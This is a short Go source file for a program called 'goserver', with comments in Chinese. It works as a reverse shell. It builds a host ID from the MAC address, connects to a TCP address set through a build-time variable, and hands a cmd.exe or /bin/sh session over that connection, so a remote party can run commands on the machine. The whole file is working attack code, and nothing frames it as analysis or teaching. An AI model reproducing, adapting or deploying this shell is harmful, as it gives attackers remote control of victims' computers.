package main

import (
	"crypto/md5"
	"encoding/hex"
	"net"

	"github.com/op/go-logging"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var log = logging.MustGetLogger("goserver")
var format = logging.MustStringFormatter(
	`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
)
var connectString string

func getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func getClientId() string {
	clientId := getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

func main() {
	//Target := flag.String("t", "", "target")
	//flag.Parse()
	//
	//if *Target == "" {
	//	flag.PrintDefaults()
	//	os.Exit(0)
	//}
	//targetAddress := *Target
	targetAddress := connectString

	// 获取主机ID
	serverId := getClientId()

	// init log config
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	log.Debug("server id:", serverId)
	log.Debug("target:", targetAddress)
	//os.Exit(0)

	var cmd *exec.Cmd

    conn, err := net.Dial("tcp", targetAddress)
    if err != nil {
        os.Exit(1)
    }
    switch runtime.GOOS {
    case "windows":
		log.Debug("windows")
        cmd = exec.Command("cmd.exe")
    case "linux":
		log.Debug("linux")
		cmd = exec.Command("/bin/sh")
    case "freebsd":
		log.Debug("freebsd")
		cmd = exec.Command("/bin/sh")
    default:
		log.Debug("default")
		cmd = exec.Command("/bin/sh")
    }
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()

	for {
		log.Debug("...")
		time.Sleep(time.Duration(6)*time.Second)
	}
}
